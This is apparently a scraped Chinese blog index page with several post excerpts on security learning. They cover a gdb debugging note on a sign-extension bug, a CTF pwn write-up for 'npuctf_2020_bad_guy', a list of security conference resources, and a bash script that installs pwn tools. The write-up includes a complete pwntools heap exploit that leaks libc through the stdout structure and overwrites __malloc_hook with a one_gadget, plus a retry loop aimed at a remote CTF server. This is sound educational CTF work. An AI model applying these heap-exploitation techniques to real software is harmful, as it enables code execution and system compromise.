fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.67ffff7f9c000-7ffff7fa0000 r--p 00214000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.67ffff7fa0000-7ffff7fa2000 rw-p 00218000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.67ffff7fa2000-7ffff7faf000 rw-p 00000000 00:00 07ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 07ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]7ffff7fc3000-7ffff7fc5000 r--p 00000000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27ffff7fc5000-7ffff7fef000 r-xp 00002000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27ffff7fef000-7ffff7ffa000 r--p 0002c000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27ffff7ffb000-7ffff7ffd000 r--p 00037000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27ffff7ffd000-7ffff7fff000 rw-p 00039000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]



何人传来无效指针?​	库函数出问题概率很低，所以找自己写的函数.  我们知道问题出在name变量上
​	frame 3 、然后用 p name 、info locals 都能看到是无效的

​	info frame 看函数的栈帧信息
​	既然是name错了 它哪里来的？ get_name，
get_name调试​	设置get_name的断点进行调试
​	返回值看rax（通常通用寄存器第一个存返回值），rax在返回的时候是没问题的，那哪里出问题了。。此时事情就很奇怪了




返回后执行ni, 单步一下,再看值,就错了




答案揭晓​	问题就出在这一条指令上,它改变了值的大小
​	cdqe: 扩展指令,使用eax的最高位拓展rax高32位的所有位
​	x86下和arm不太一样, sxtw这条指令有问题（arm下
​	这是编译器故意产生的指令,和没有include这个函数有关系,再深入的..就先放放
问题与知识补充
include进来就没问题了

 #include “parser.c”
但是有个新的warning
32位下编译没问题
为什么会有一个nop指令
nop插桩
如何跑arm系统macbook直接可以
x86怎么装？：看样子基本上离不开qemu
云服务器买
https://blog.csdn.net/chenxiangneu/article/details/78955462
设置符号服务器？
失败了如何再执行？info signal
info handle
handle SIGSEGV nopass （不给应用程序
再跑一遍又会收到这个信号
smd指令。。。
用户空间 内核空间大小
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-44-houseofroman/" title="pwn入门-44-houseofroman">pwn入门-44-houseofroman</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-25T08:58:22.000Z" title="发表于 2023-10-25 16:58:22">2023-10-25</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-03T09:38:41.825Z" title="更新于 2023-11-03 17:38:41">2023-11-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​	在一次比赛中遇到了堆题,没有show函数,懵逼了…当时有略过一丝思路通过io stdout输出,但奈何这方面知识了解还不多(不过确实可以通过搜索引擎 搜索关键字来找到这种手法)
​	(后来发现这是n年前的手法了😭, 
例题npuctf_2020_bad_guy
题目分析经典菜单堆,但是没有show
1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int num; // eax  prog_init(argc, argv, envp);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;=== Bad Guy ===&quot;);      puts(&quot;1. Malloc&quot;);      puts(&quot;2. Edit&quot;);      puts(&quot;3. Free&quot;);      printf(&quot;&gt;&gt; &quot;);      num = read_num();      if ( num != 2 )        break;      edit();    &#125;    if ( num &gt; 2 )    &#123;      if ( num == 3 )      &#123;        delete();      &#125;      else      &#123;        if ( num == 4 )          exit(0);LABEL_13:        puts(&quot;2333, Bad Guy!&quot;);      &#125;    &#125;    else    &#123;      if ( num != 1 )        goto LABEL_13;      add();    &#125;  &#125;&#125;

结构体1234struct &#123;    int size;    char *content;&#125; heaparray;

add12345678910111213141516171819ssize_t add()&#123;  unsigned __int64 num; // [rsp+0h] [rbp-10h]  __int64 size; // [rsp+8h] [rbp-8h]  printf(&quot;Index :&quot;);  num = read_num();  printf(&quot;size: &quot;);  size = read_num();  *((_QWORD *)&amp;heaparray + 2 * num + 1) = malloc(size);  if ( !*((_QWORD *)&amp;heaparray + 2 * num + 1) || num &gt; 0xA )  &#123;    puts(&quot;Bad Guy!&quot;);    exit(1);  &#125;  *((_QWORD *)&amp;heaparray + 2 * num) = size;  printf(&quot;Content:&quot;);  return read(0, *((void **)&amp;heaparray + 2 * num + 1), size);&#125;

heaparray是存放分配堆块的指针的
1234pwndbg&gt; tele 0x55555560204000:0000│  0x555555602040 (heaparray) ◂— 0x1401:0008│  0x555555602048 (heaparray+8) —▸ 0x555555400ced (add+92) ◂— mov rdx, qword ptr [rbp - 0x10]02:0010│  0x555555602050 (heaparray+16) ◂— 0x0



deletefree过后 也置0了
如果不置0,那free是干了什么..我记得是..
12345678910111213141516171819int delete()&#123;  _QWORD *v0; // rax  unsigned __int64 num; // [rsp+8h] [rbp-8h]  printf(&quot;Index :&quot;);  num = read_num();  if ( *((_QWORD *)&amp;heaparray + 2 * num + 1) || num &gt; 0xA )  &#123;    free(*((void **)&amp;heaparray + 2 * num + 1));    v0 = (_QWORD *)((char *)&amp;heaparray + 16 * num + 8);    *v0 = 0LL;  &#125;  else  &#123;    LODWORD(v0) = puts(&quot;Bad Guy!&quot;);  &#125;  return (int)v0;&#125;



edit1234567891011121314151617181920int edit()&#123;  unsigned __int64 num; // [rsp+0h] [rbp-10h]  __int64 nbytes; // [rsp+8h] [rbp-8h]  if ( count &lt;= 0 )  &#123;    puts(&quot;Bad Guy!&quot;);    exit(1);  &#125;  --count;  printf(&quot;Index :&quot;);  num = read_num();  printf(&quot;size: &quot;);  nbytes = read_num();  if ( !*((_QWORD *)&amp;heaparray + 2 * num + 1) || num &gt; 9 )    return puts(&quot;Bad Guy!&quot;);  printf(&quot;content: &quot;);  return read(0, *((void **)&amp;heaparray + 2 * num + 1), nbytes);&#125;



这里是漏洞点,可以读入任意的大小
alarm 把值给改了
123456789pwndbg&gt; niProgram received signal SIGALRM, Alarm clock.0x0000555555400ced in add ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────*RAX  0x555555602040 (heaparray) ◂— 0x0 RBX  0x0*RCX  0x555555400ced (add+92) ◂— mov rdx, qword ptr [rbp - 0x10]



123456unsigned int prog_init()&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  return alarm(0x3Cu);&#125;



思路开了pie,应该先想办法泄漏地址,然后用onegadget覆盖malloc_hook等即可
泄露地址​	利用io stdout进行泄漏、(前期方便调试可以本地先关闭alsr)
​	具体来说,要构造堆块重叠(类似double free感觉?如果不够造但是可以直接修改地址吗不是), 修改_IO_2_1_stdout _的flags值(原理在最后) ,然后就可以泄露地址了
​	构造四个堆块,free掉0x60的2号,然后利用edit的漏洞把1大小改为0x90,然后释放,然后通过malloc一个0x10大小堆块,使得剩余的堆块与释放的2号堆块重叠
​	重叠的目的是把unsortedbin的fd的地址放到fastbin地址那里,让fastbin能利用这个地址进行申请
123456789101112malloc(0,0x10)   malloc(1,0x10)   malloc(2,0x60)   malloc(3,0x10)   free(2)   payload = p64(0)*3 + p64(0x91)# + p64(0) * 3 + p64(0x91)   edit(0,len(payload),payload)   free(1)   #pause()   malloc(4,0x10)   #pause()

​	没有malloc 0x10前,可以看到fastbin的位置,以及它的fd是没有值的

​	malloc后

​	将后四字节修改为0x255，然后malloc两次就可以分到_IO_2_1_stdout _上面的位置,之所以要分配0x25dd那里,是因为要满足堆的大小检查要求
1234567payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p16(0x25dd) #* 3 + p64(0x91)   edit(0,len(payload),payload)   #pause()   malloc(5,0x60)   #pause()   payload = 0x33 * p8(0) + p64(0xfbad800) + p64(0)*3 + p8(0)   malloc(6,0x60,payload)


​	不满足要求的话会报错 Error in &#96;.&#x2F;npuctf_2020_bad_guy’: malloc(): memory corruption (fast): 0x00007ffff7dd25f5 ,这一块等分析源码的时候再细看
​	malloc完之后,_IO_2_1_stdout的flags就被修改了， 也就是要修改对应flag的值 和 _IO_write_base, _IO_write_ptr, _IO_write_end等 就会自动输出缓存区的信息??????

​	然后就会泄露libc地址了,泄漏的地址是多少呢,是0x7ffff7dd2600,为啥呢?,减去偏移就得到了基址
 payload &#x3D; 0x33 * p8(0) + p64(0xfbad800) + p64(0)*3 + p8(0)
(0x33 &#x3D; 51  &#x3D; 6*8 + 3)   + 2  *  8 +1    &#x3D; 8 * 8 + 4
从 0xed那里开始输入数据, 0x33 * p8(0)  &#x3D; 51, 而0x2620-0x25ed正好是51
故伎重演,替换malloc_hook为onegadget​	此时堆的布局的话,还有一个0x60大小的unsortedbin, 分了再free放进fastbin, 此时有地址了,就不需要那么麻烦再利用unsortedbin的地址了,直接edit修改就可以了,然后两次malloc把__malloc_hook那里改为onegadget
12345678malloc(7,0x60)   #pause()   free(7)   payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p64(libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23) #* 3 + p64(0x91)   edit(0,len(payload),payload)   malloc(8,0x60)   payload = 0x13 * p8(0) + p64(libc.offset_to_vaddr(one[3]))   malloc(9,0x60,payload)



如何开启了alsr 如何爆破呢​	学到了, 这样获取错误, 以前自己写循环tryexcept这里一直有问题,回头可以试试用这里的是否可以
123456789101112while 1:    try:        pwn()        break    except KeyboardInterrupt:        p.close()        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)        #p = process(binary)    except :        p.close()        #p = process(binary)        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)



枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?
一些细节libc的版本​	做题的话注意一下版本,buuctf用的是2.23-0ubuntu11_amd64,这个版本我在网上没找到,找到的没符号,自己编译的还报错(用ubuntu20编译的,不知道16是不是可以)
​	不同版本偏移不一样
​	但是那个2.23- 多少是一样的
exp用的这位师傅的: https://blog.csdn.net/csdn546229768/article/details/123717993
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#! /usr/bin/pythonfrom pwn import *#import syscontext.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;SigreturnFrame(kernel = &#x27;amd64&#x27;)binary = &quot;./npuctf_2020_bad_guy&quot;one = [0x45226,0x4527a,0xf03a4,0xf1247]  #2.23-0ubuntu11.3#one = [0x45216,0x4526a,0xf02a4,0xf1147] # buuctf#idx = int(sys.argv[1])global plocal = 1if local:    p = process(binary)    #gdb.attach(p)    e = ELF(binary)    libc = e.libcelse:    p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)    e = ELF(binary)    #libc = e.libc    libc = ELF(&#x27;./libc-2.23.buu.so&#x27;)################################ Condfig ############################################sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sa = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)it = lambda :p.interactive()def z(s=&#x27;b main&#x27;):    gdb.attach(p,s)def logs(mallocr,string=&#x27;logs&#x27;):    if(isinstance(mallocr,int)):       print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,mallocr))    else:       print(&#x27;\033[1;31;40m%20s--&gt;%s\033[0m&#x27;%(string,mallocr))def pa(s=&#x27;1&#x27;):    log.success(&#x27;pause : step---&gt; &#x27;+str(s))    pause()def info(data,key=&#x27;info&#x27;,bit=64):    if(bit == 64):      leak = u64(data.ljust(8, b&#x27;\0&#x27;))    else:      leak = u32(data.ljust(4, b&#x27;\0&#x27;))    logs(leak,key)    return leak################################ Function ############################################def malloc(i,s,c = &#x27;A&#x27;):    sla(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)    sla(&#x27;Index :&#x27;,str(i))    sla(&#x27;size:&#x27;,str(s))    sa(&#x27;Content:&#x27;,c)def edit(i,s,c = &#x27;A&#x27;):    sla(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)    sla(&#x27;Index :&#x27;,str(i))    sla(&#x27;size:&#x27;,str(s))    sa(&#x27;content:&#x27;,c)def free(i):    sla(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)    sla(&#x27;Index :&#x27;,str(i))################################### Statr ############################################def pwn():    malloc(0,0x10)    malloc(1,0x10)    malloc(2,0x60)    malloc(3,0x10)    free(2)    payload = p64(0)*3 + p64(0x91)# + p64(0) * 3 + p64(0x91)    edit(0,len(payload),payload)    free(1)    malloc(4,0x10)    payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p16(0x25dd) #* 3 + p64(0x91)    edit(0,len(payload),payload)    #pause()    malloc(5,0x60)    payload = 0x33 * p8(1) + p64(0xfbad800) + p64(0)*3 + p8(0)    #pause()    malloc(6,0x60,payload)    #pa()    #libc.address = info(ru(&#x27;\x7f&#x27;)[-6:]) - (0x7ffff7dd2600 - 0x7ffff7a0d000)    #libc.address = info(ru(&#x27;\x7f&#x27;)[-6:])    #print(hex(libc.address))    libc.address = info(ru(&#x27;\x7f&#x27;)[-6:]) - (0x7ffff7dd2600 - 0x7ffff7a0d000)    print(hex(libc.address))    #pause()    malloc(7,0x60)    #pause()    free(7)    #pause()    payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x71) + p64(libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23) #* 3 + p64(0x91)    #pause()    edit(0,len(payload),payload)    malloc(8,0x60)    payload = 0x13 * p8(0) + p64(libc.offset_to_vaddr(one[3]))    malloc(9,0x60,payload)    #pause()    sla(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)    sla(&#x27;Index :&#x27;,str(10))    sla(&#x27;size:&#x27;,str(10))    p.interactive()################################### End ##############################################pwn()p.close()&#x27;&#x27;&#x27;while 1:    try:        pwn()        break    except KeyboardInterrupt:        p.close()        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)        #p = process(binary)    except :        p.close()        #p = process(binary)        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)        &#x27;&#x27;&#x27;



参考https://blog.csdn.net/u014377094/article/details/124577350
https://blog.csdn.net/csdn546229768/article/details/123717993
IO_stdout泄漏libc
pwndbg: parseheap
https://zhuanlan.zhihu.com/p/320151545 这个蛮详细的
https://blog.csdn.net/zzq487782568/article/details/123773034 这个整体思路可以 利用unstortedbin打stdout泄露出libc
https://www.cnblogs.com/LynneHuan/p/14851770.html
https://j-kangel.github.io/2020/03/13/利用-IO-2-1-stdout-泄漏libc/#分析
遗留问题为什么后来分配的 malloc(4,0x10)的fd和nt是那个值呢？
枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?
pwndbg: parseheap
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/" title="网安四大顶会及科研前沿资源整理">网安四大顶会及科研前沿资源整理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-20T06:59:53.000Z" title="发表于 2023-10-20 14:59:53">2023-10-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-21T10:51:45.469Z" title="更新于 2024-01-21 18:51:45">2024-01-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/">科研(并没有)</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E8%AE%BA%E6%96%87/">论文</a></span></div><div class="content">研一读了一点论文,研二开始读的少了,毕竟是专硕………. 不过好歹是学习到了一点东西,觉得有必要整理一下,将来肯定还会用到.
科研 https://www.aminer.cn 这种集合网站,可以按照论文等级等搜索,挺好用的
顶会论文,其他CCF类论文
论文寻找方式, 下载方式  知网 scihub、  中文期刊
其他 像 blackhat等会议
论文知识图谱
dblp
国外几大出版社
https://arxiv.org
一、论文获取四大顶会​	网安有四大顶会, 文章质量非常高,代表了最前沿的网安技术.


1. usenix security官网:https://www.usenix.org
​	可以从上方的conferences找到会议信息,或者直接进这个链接,有历年的https://www.usenix.org/conferences/byname/108




​	从主入口进的不一定是usenix顶会会议,还有其他会议,这个才是




然后可以从program里面找paper






快速的论文检索: 可以看目录 program–TECHNICAL SESSIONS–Table of Contents
可以从里面看小标题分类,找感兴趣的方向
https://www.usenix.org/sites/default/files/sec23_contents.pdf
2.NDSS官网:https://www.ndss-symposium.org
NDSS收文量就少很多了,上方导航能很清晰看到会议信息,
可以查看目录快速浏览(program-symposium program-Proceedings Frontmatter):https://www.ndss-symposium.org/wp-content/uploads/NDSS2022_Proceedings_Front_Matter.pdf
https://www.likecs.com/show-433567.html
https://www.ndss-symposium.org/ndss2019/accepted-papers/
3.CCSACM SIGSAC Conference on Computer and Communications Security
官网: https://www.sigsac.org/ccs.html
acm数据库中: https://dl.acm.org/conference/ccs/proceedings  可以看Front Matter,类似于目录
https://www.sigsac.org/ccs/CCS2018/proceedings/
https://www.sigsac.org/ccs/CCS2022/program/accepted-papers.html
4. S&amp;PIEEE Symposium on Security and Privacy
官网:https://www.ieee-security.org/index.html
dblp:https://dblp.uni-trier.de/db/conf/sp/index.html
2023年的: https://www.ieee-security.org/TC/SP2023/
sp的sok论文(综述论文) https://oaklandsok.github.io
这个好像分了sp和euro sp, euro sp就不是A类会议了?
CCF推荐

中文论文​	虽然确实好的期刊大部分都是国外的,尤其是top,但不能一棒子否认国内的期刊,国内也是要发展的,也不能都投到国外,中文期刊还是有一些不错的,可以参考. 尤其是前期调研,读大段英语费劲的时候,可以先看看中文的,(不过话说是不是英语很好了就没这个问题了..233)
信息安全学报 http://jcs.iie.ac.cn/xxaqxb/ch/index.aspx
电子学报 https://www.ejournal.org.cn/CN/0372-2112/home.shtml
计算机学报
其他途径获取公众号,如gossip
硕博论文二、论文工具与经验https://www.researchrabbit.ai/
工具:Connected Papers https://www.connectedpapers.com/
https://letpub.com.cn/ 可以查影响因子什么的
大佬们:
https://dl.acm.org/profile/81100363323
苏璞睿:二进制漏洞 https://people.ucas.edu.cn/~purui
信息计量学

zotero一个非常好用的文献管理工具, 还可以选择翻译!
经验找论文可以以一篇好的综述，往旧的年份找的话，看它引用，往新的年份找的话，可以看谁引用了它
看引用数量也可以看出来文章的质量,(就不用看期刊的等级了)
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/" title="pwn入门-43-pwn做题环境搭建脚本">pwn入门-43-pwn做题环境搭建脚本</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-04T12:56:34.000Z" title="发表于 2023-10-04 20:56:34">2023-10-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-04T13:09:56.892Z" title="更新于 2023-10-04 21:09:56">2023-10-04</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E8%84%9A%E6%9C%AC/">脚本</a></span></div><div class="content">​		之前m1不支持x86,一直用云服务器有时候经常换,每次都需要手动搭建环境,一直想写个脚本,但有时候一直懒…终于整理出来了..
(感谢chatgpt)
​		然后这个脚本目前还有很多小问题和可以改进的地方
要安装的内容123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# 必要的安装apt-get updateapt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential# 安装常用工具sudo apt install -y git vim gdb strace ltrace  socat netcat# 安装pwntoolspython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools# 安装pwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.shecho &quot;source /ctfpwntools/pwndbg/gdbinit.py&quot; &gt;&gt; ~/.gdbinitcd ..# 安装glibc-all-in-onegit clone https://github.com/matrix1001/glibc-all-in-one.gitcd glibc-all-in-one/python3 update_listcd ..# 安装ROPgadgetpip install capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo python3 setup.py install# one_gadgetapt -y install rubygem install one_gadget # LibcSearchergit clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython3 setup.py developcd ..# patchelfapt-get install autoconf automake libtoolgit clone https://github.com/NixOS/patchelf.gitcd patchelf./bootstrap.sh ./configuremakemake checkmake installcd ..##  seccomp# 1.添加仓库  sudo add-apt-repository ppa:brightbox/ruby-ng  sudo apt-get update# 2.指定安装 ruby 2.6 版本  sudo apt-get install ruby2.6 ruby2.6-dev # 3.然后安装 seccomp-tools  sudo gem install seccomp-tools# 32位libcdpkg --add-architecture i386apt-get install libc6:i386apt-get install libgtk2.0-0:i386



简单的开始​		简单的创建while循环,指定安装次数
12345678910111213141516171819202122232425262728293031323334353637383940414243444546#! /bin/bashmkdir /ctfpwntoolscd /ctfpwntoolsMAX_RETRIES=3INSTALL_SUCCESS=falseRETRY_COUNT=0# 更新apt源sudo apt update# 安装常用工具sudo apt install -y git vim gdb strace ltrace nmap socat netcat# 安装pwntoolswhile [ $RETRY_COUNT -lt $MAX_RETRIES ] &amp;&amp; [ &quot;$INSTALL_SUCCESS&quot; = false ]do    echo &quot;Attempt $((RETRY_COUNT+1)) to install pwntools...&quot;    apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential    python3 -m pip install --upgrade pip    python3 -m pip install --upgrade pwntools    # 检查安装是否成功    if [ $? -eq 0 ]; then        INSTALL_SUCCESS=true    else        RETRY_COUNT=$((RETRY_COUNT+1))    fidoneif [ &quot;$INSTALL_SUCCESS&quot; = true ]; then    echo &quot;pwntools installed successfully!&quot;else    echo &quot;Failed to install pwntools after $MAX_RETRIES attempts.&quot;fiMAX_RETRIES=3INSTALL_SUCCESS=falseRETRY_COUNT=0# 安装pwndbgwhile....



另外一种方式​		只需要定义一个变量, 而且代码量少了很多
12345678910111213141516171819202122232425262728293031#!/bin/bash# 定义变量MAX_RETRY=3# 更新apt源for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if sudo apt update; then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;更新apt源时出现错误&quot;    exit 1  fi  echo &quot;更新apt源失败，正在进行第$i次重试...&quot;  sleep 1done# 安装常用工具for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if xxxxxxxxxxx; then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装常用工具时出现错误&quot;    exit 1  fi  echo &quot;安装常用工具失败，正在进行第$i次重试...&quot;  sleep 1done



定好模版123456789101112131415161718#!/bin/bash# 定义变量MAX_RETRY=3# 安装常用工具for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if xxxxxxxxxxx; then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装常用工具时出现错误&quot;    exit 1  fi  echo &quot;安装常用工具失败，正在进行第$i次重试...&quot;  sleep 1done



套上!123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#! /bin/bashmkdir /ctfpwntoolscd /ctfpwntools# 定义变量MAX_RETRY=3# 必要的更新、安装常用工具for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (apt-get update;apt-get -y install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential git vim gdb strace ltrace  socat netcat); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;更新、安装常用工具时出现错误&quot;    exit 1  fi  echo &quot;更新、安装常用工具失败，正在进行第$i次重试...&quot;  sleep 1done# 安装pwntoolsfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (python3 -m pip install --upgrade pip;python3 -m pip install --upgrade pwntools); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装pwntools时出现错误&quot;    exit 1  fi  echo &quot;安装pwntools失败，正在进行第$i次重试...&quot;  sleep 1done# 安装pwndbgfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (git clone https://github.com/pwndbg/pwndbg;cd pwndbg;./setup.sh;echo &quot;source /ctfpwntools/pwndbg/gdbinit.py&quot; &gt;&gt; ~/.gdbinit;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装pwndbg时出现错误&quot;    exit 1  fi  echo &quot;安装pwndbg失败，正在进行第$i次重试...&quot;  sleep 1done# 安装glibc-all-in-onefor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (git clone https://github.com/matrix1001/glibc-all-in-one.git;cd glibc-all-in-one/;python3 update_list;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装glibc-all-in-one时出现错误&quot;    exit 1  fi  echo &quot;安装glibc-all-in-one失败，正在进行第$i次重试...&quot;  sleep 1done# 安装ROPgadgetfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (pip install capstone;git clone https://github.com/JonathanSalwan/ROPgadget.git;cd ROPgadget;sudo python3 setup.py install;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装ROPgadget时出现错误&quot;    exit 1  fi  echo &quot;安装ROPgadget失败，正在进行第$i次重试...&quot;  sleep 1done# one_gadget# 32位libcfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (apt -y install ruby;gem install one_gadget;dpkg --add-architecture i386;apt-get -y install libc6:i386 libgtk2.0-0:i386); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装one_gadget时出现错误&quot;    exit 1  fi  echo &quot;安装one_gadget失败，正在进行第$i次重试...&quot;  sleep 1done# LibcSearcherfor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (git clone https://github.com/lieanu/LibcSearcher.git;cd LibcSearcher;python3 setup.py develop;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装LibcSearcher时出现错误&quot;    exit 1  fi  echo &quot;安装LibcSearcher失败，正在进行第$i次重试...&quot;  sleep 1done# patchelffor (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (apt-get install autoconf automake libtool;git clone https://github.com/NixOS/patchelf.git;cd patchelf;./bootstrap.sh;./configure;make;make check;make install;cd ..); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装patchelf时出现错误&quot;    exit 1  fi  echo &quot;安装patchelf失败，正在进行第$i次重试...&quot;  sleep 1done##  seccomp //安装失败## ruby版本会和上面那个onegadget冲突吗??for (( i=1; i&lt;=$MAX_RETRY; i++ )); do  if (add-apt-repository ppa:brightbox/ruby-ng;apt-get install ruby2.6 ruby2.6-dev ;gem install seccomp-tools); then    break  fi  if [ $i -eq $MAX_RETRY ]; then    echo &quot;安装seccomp时出现错误&quot;    exit 1  fi  echo &quot;安装seccomp失败，正在进行第$i次重试...&quot;  sleep 1done





问题pip还是pip3呢
还有一些小问题、以及还有其他有用工具没安装
参考https://blog.csdn.net/mandiheyanyu/article/details/122455348
安装工具参考: https://blingblingxuanxuan.github.io/2020/02/23/paper/
